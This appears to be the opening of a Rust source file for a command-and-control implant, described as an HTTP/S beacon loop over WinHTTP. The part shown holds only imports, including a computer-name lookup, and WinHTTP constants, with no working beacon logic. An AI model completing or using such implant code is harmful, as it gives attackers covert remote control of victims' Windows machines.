//! c2.rs — HTTP/S beacon loop using WinHTTP
#![allow(dead_code, non_snake_case, non_upper_case_globals)]

use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::um::winhttp::{
    WinHttpOpen, WinHttpConnect, WinHttpOpenRequest,
    WinHttpSendRequest, WinHttpReceiveResponse, WinHttpReadData,
    WinHttpCloseHandle, WinHttpSetOption, WinHttpQueryHeaders,
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
    WINHTTP_FLAG_SECURE,
};
use winapi::um::winbase::GetComputerNameW;
use winapi::shared::minwindef::MAX_PATH;

// Constants not exported by all winapi versions
const WINHTTP_NO_REFERER:             *const u16    = core::ptr::null();
const WINHTTP_DEFAULT_ACCEPT_TYPES:   *mut *mut u16 = core::ptr::null_mut();
const WINHTTP_NO_PROXY_NAME:          *mut u16 = core::ptr::null_mut();
const WINHTTP_NO_PROXY_BYPASS:        *mut u16 = core::ptr::null_mut();
const WINHTTP_QUERY_STATUS_CODE:      DWORD    = 19;
const WINHTTP_QUERY_FLAG_NUMBER:      DWORD    = 0x20000000;
const WINHTTP_OPTION_CONNECT_TIMEOUT: DWORD    = 3;
const WINHTTP_OPTION_SEND_TIMEOUT:    DWORD    = 5;
const WINHTTP_OPTION_RECEIVE_TIMEOUT: DWORD    = 6;
